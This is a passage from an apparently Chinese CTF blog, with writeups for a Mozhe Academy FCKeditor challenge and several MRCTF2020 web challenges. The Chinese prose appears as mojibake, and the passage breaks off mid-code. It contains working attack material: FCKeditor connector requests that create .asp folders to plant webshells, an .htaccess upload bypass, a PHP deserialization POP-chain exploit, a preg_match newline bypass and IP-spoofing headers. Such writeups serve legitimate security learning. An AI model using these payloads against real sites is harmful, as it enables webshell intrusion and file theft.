class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z.asp</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;CurrentFolder&#x3D;&#x2F;&amp;Type&#x3D;Image&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure><p><strong>4. æ–‡ä»¶è§£æé™åˆ¶</strong></p><p>é€šè¿‡Fckeditorç¼–è¾‘å™¨åœ¨æ–‡ä»¶ä¸Šä¼ é¡µé¢ä¸­ï¼Œåˆ›å»ºè¯¸å¦‚1.aspæ–‡ä»¶å¤¹ï¼Œç„¶åå†åˆ°è¯¥æ–‡ä»¶å¤¹ä¸‹ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡çš„webshellæ–‡ä»¶ï¼Œè·å–å…¶shellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.moonback.xyz&#x2F;images&#x2F;upload&#x2F;201806&#x2F;image&#x2F;1.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure><p>å…³äºè§£ææ¼æ´å‚è€ƒï¼š<a href="https://www.secpulse.com/archives/3750.html">https://www.secpulse.com/archives/3750.html</a></p><p>æœ€ç»ˆä¸Šä¼ ç±»ä¼¼<code>shell.asp;jpg</code>å°±èƒ½ä¸Šä¼ æˆåŠŸï¼ŒæˆåŠŸä¹‹åä¼šæŠŠç›®å½•æ–‡ä»¶åˆ—ä¸¾å‡ºæ¥,åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;userfiles&#x2F;file&#x2F;shell.asp;jpg</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ‰¾flagå°±è¡Œ</p><img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200413224623.png" style="zoom:67%;"><p>å¦‚æœæ‰¾ä¸åˆ°ç›®å½•çš„è¯å¯ä»¥è¯•è¯•</p><p><strong>1. æ ¹æ®xmlè¿”å›ä¿¡æ¯æŸ¥çœ‹ç½‘ç«™ç›®å½•</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.-sec.org&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;..&#x2F;..&#x2F;..&#x2F;&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure><p><strong>2. è·å–å½“å‰æ–‡ä»¶å¤¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><p><strong>3. æ¸¸è§ˆcç›˜</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;Curre</span><br></pre></td></tr></table></figure><p>11</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> å¢¨è€…å­¦é™¢ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 writeup</title>
      <link href="2020/04/11/MRCTF2020-writeup/"/>
      <url>2020/04/11/MRCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†MRCTF 2020éƒ¨åˆ†é¢˜ç›®çš„writeup!</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>æŸ¥çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200411114856.png" style="zoom: 67%;"><h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200411143044.png" style="zoom:80%;"><h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p>è¯•äº†å¥½å¤šï¼Œå‘ç°åªèƒ½ä¼ pngæ ¼å¼çš„æ–‡ä»¶,<code>.htaccess</code>ç»•è¿‡</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200411144913.png" style="zoom:80%;"><p>å†ä¸Šä¼ ä¸€ä¸ªpngçš„å›¾ç‰‡é©¬å³å¯</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200411145316.png" style="zoom:80%;"><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>popé“¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show-&gt;__wakeup()-&gt;preg_match()-&gt;__toString()-&gt;Test-&gt;__get-&gt;Modifier-&gt;__invoke-&gt;append()</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ï¼Œååºåˆ—åŒ–é¦–å…ˆä¼šæ‰§è¡Œ<code>__wakeup()</code>æ–¹æ³•ï¼Œç„¶åpreg_matchåŒ¹é…è§¦å‘<code>__toString</code>æ–¹æ³•ï¼Œå³å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²åŒ¹é…æ—¶ï¼Œ<code>$str</code>æ˜¯ä¸€ä¸ª<code>Test</code>å¯¹è±¡ï¼Œè·å¾—<code>source</code>å±æ€§ä»è€Œè§¦å‘<code>__get()</code>æ–¹æ³•ï¼Œ<code>$p</code>è¢«èµ‹å€¼ä¸º<code>Modifier</code>å¯¹è±¡ï¼Œç±»å½“ä½œå‡½æ•°è°ƒç”¨è§¦å‘<code>__invoke</code>æ–¹æ³•ï¼Œæ¥ç€å°±æ˜¯æ–‡ä»¶åŒ…å«php://fiter base64è¯»æ–‡ä»¶äº†</p><h3 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h3><p>æŸ¥çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼Œpreg_matchæ¢è¡Œç»•è¿‡ï¼Œpayload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>æç¤º<code>secrettw.php</code>æŸ¥çœ‹æºä»£ç ï¼Œæ˜æ˜¾æ˜¯jsfuck</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200412154645.png" style="zoom:80%;"><p>æ§åˆ¶å°æ‰§è¡Œï¼Œæç¤º</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200412154755.png" style="zoom:80%;"><p>POSTè¿‡å»ä¸€ä¸ªå‚æ•°ä¸ºMerakï¼Œå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>æŠŠchangeå‡½æ•°é€†å‘ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    $s = base64_encode($re);</span><br><span class="line">    <span class="keyword">echo</span>  $s;</span><br><span class="line">&#125;</span><br><span class="line">change(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">// ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure><p>ä¼ªé€ ä¸€ä¸‹ip:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Forwarded-Host:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-remote-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-remote-addr:127.0.0.1</span></span><br><span class="line"><span class="attribute">True-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Real-IP:127.0.0.1</span></span><br></pre></td></tr></table></figure><p>2333é‚£é‡Œç”¨data://åè®®</p><p>æœ€ç»ˆè¯·æ±‚</p><img src="/2020/04/11/MRCTF2020-writeup/TIMæˆªå›¾20200412160934.png" style="zoom:80%;"><h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>dirsearchæ‰«ä¸çŸ¥ä¸ºå•¥æ‰«ä¸å‡ºæ¥ï¼Œæ‰‹æ€¼<code>/www.zip</code>ï¼Œindex.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span 